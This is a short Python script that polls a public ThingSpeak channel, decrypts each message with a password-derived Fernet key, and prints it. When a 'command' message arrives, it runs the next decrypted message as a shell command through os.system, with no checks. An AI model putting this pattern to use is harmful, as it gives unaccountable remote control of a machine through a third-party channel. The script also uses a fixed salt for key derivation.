import requests
from cryptography.fernet import Fernet
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import os
import time
import string
import random

def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):  # If Machine is running on Windows, use cls
        command = 'cls'
    os.system(command)

oldmsg = ""
msg = " "
commandSwitch = False;
f = open('key.txt','r')
password = f.read().encode()
clearConsole();
while (str(msg)[2:-1] != "exit"):
    msg=requests.get("https://thingspeak.com/channels/1461170/field/1")
    msg=msg.json()['feeds'][-1]['field1']
    very_old = msg;
    salt = b'salt_'
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
    key = base64.urlsafe_b64encode(kdf.derive(password))
    f=Fernet(key)
    msg=msg[2:-1]
    msg=bytes(msg,'utf-8')
    msg=f.decrypt(msg)
    if (str(msg)[2:-1] == "command"):
        commandSwitch = True;
        print("\n\n\n<<<<<Command incoming... please stand by...>>>>>\n\n\n");
        while (str(msg)[2:-1] == "command"):
            msg=requests.get("https://thingspeak.com/channels/1461170/field/1")
            msg=msg.json()['feeds'][-1]['field1']
            very_old = msg;
            salt = b'salt_'
            kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
            key = base64.urlsafe_b64encode(kdf.derive(password))
            f=Fernet(key)
            msg=msg[2:-1]
            msg=bytes(msg,'utf-8')
            msg=f.decrypt(msg)
        os.system(str(msg)[2:-1]);
        oldmsg = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 255));
        print("\n\n\n<<<<<Command complete...>>>>>\n\n\n");
    elif (oldmsg != very_old):
        print(str(msg)[2:-1] + "\n")
    oldmsg = very_old;
